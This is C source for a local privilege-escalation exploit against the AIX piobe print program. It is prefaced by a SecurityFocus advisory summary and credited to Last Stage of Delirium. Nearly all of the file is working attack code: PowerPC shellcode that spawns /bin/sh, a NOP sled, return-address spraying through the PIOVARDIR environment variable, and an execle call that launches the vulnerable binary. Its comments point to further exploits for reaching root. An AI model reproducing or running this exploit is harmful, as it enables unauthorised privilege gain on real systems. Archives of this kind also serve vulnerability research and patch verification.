/*
source: https://www.securityfocus.com/bid/2037/info

AIX is a variant of the UNIX Operating System, distributed by IBM. A problem exists which can allow a local user elevated priviledges.

The problem exists in the piobe program. Due to the insuffient handling of the PIOSTATUSFILE, PIOTITLE, and PIOVARDIR environment variables, it's possible to overwrite stack variables. This makes it possible for a malicious user to pass specially formatted strings to the program via environment variables, and potentially gain administrative access.
*/

/*## copyright LAST STAGE OF DELIRIUM dec 2000 poland        *://lsd-pl.net/ #*/
/*## /usr/lib/lpd/piobe                                                      #*/

/*   note: to avoid potential system hang-up please, first obtain the exact   */
/*   AIX OS level with the use of the uname -a or oslevel commands            */

/*   this code gives privilages of a printq group and command shell (without  */
/*   a prompt). from that point euid=root can be gained with the use of our   */
/*   aix_piodmgrsu or aix_digest codes                                        */

#define ADRNUM 3000
#define NOPNUM 16000

char shellcode[]=
    "\x7c\xa5\x2a\x79"     /* xor.    r5,r5,r5               */
    "\x40\x82\xff\xfd"     /* bnel    <shellcode>            */
    "\x7f\xe8\x02\xa6"     /* mflr    r31                    */
    "\x3b\xff\x01\x20"     /* cal     r31,0x120(r31)         */
    "\x38\x7f\xff\x08"     /* cal     r3,-248(r31)           */
    "\x38\x9f\xff\x10"     /* cal     r4,-240(r31)           */
    "\x90\x7f\xff\x10"     /* st      r3,-240(r31)           */
    "\x90\xbf\xff\x14"     /* st      r5,-236(r31)           */
    "\x88\x5f\xff\x0f"     /* lbz     r2,-241(r31)           */
    "\x98\xbf\xff\x0f"     /* stb     r5,-241(r31)           */
    "\x4c\xc6\x33\x42"     /* crorc   cr6,cr6,cr6            */
    "\x44\xff\xff\x02"     /* svca                           */
    "/bin/sh\xff"
;

char nop[]="\x7f\xff\xfb\x78";

main(int argc,char **argv,char **e){
    char buffer[20000],adr[4],*b,*envp[4];
    int i,align;

    printf("copyright LAST STAGE OF DELIRIUM dec 2000 poland  //lsd-pl.net/\n");
    printf("/usr/lib/lpd/piobe for aix 4.1 4.2 4.3 4.3.x PowerPC/POWER\n\n");

    if(argc<2){
        printf("usage: %s 41|42|43|433\n",argv[0]);exit(-1);
    }

    switch(atoi(argv[1])){
    case  41: shellcode[55]=0x03;align=2; break;
    case  42: shellcode[55]=0x02;align=0; break;
    case  43: shellcode[55]=0x04;align=0; break;
    case 433: shellcode[55]=0x03;align=0; break;
    default: exit(-1);
    }

    i=0; while(*e++) i+=strlen(*e)+1;
    *((unsigned long*)adr)=(unsigned long)e+(i&~3)-8000;

    envp[0]="PIOSTATUSFILE=lsd";
    envp[1]=buffer;
    envp[2]=&buffer[3500];
    envp[3]=0;

    b=buffer;
    strcpy(b,"PIOVARDIR=");b+=10;
    for(i=0;i<align;i++) *b++=' ';
    for(i=0;i<ADRNUM;i++) *b++=adr[i%4];
    *b=0;

    b=&buffer[3500];
    sprintf(b,"xxx=");b+=4;
    for(i=0;i<3-align;i++) *b++=' ';
    for(i=0;i<NOPNUM;i++) *b++=nop[i%4];
    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];

    execle("/usr/lib/lpd/piobe","lsd",0,envp);
}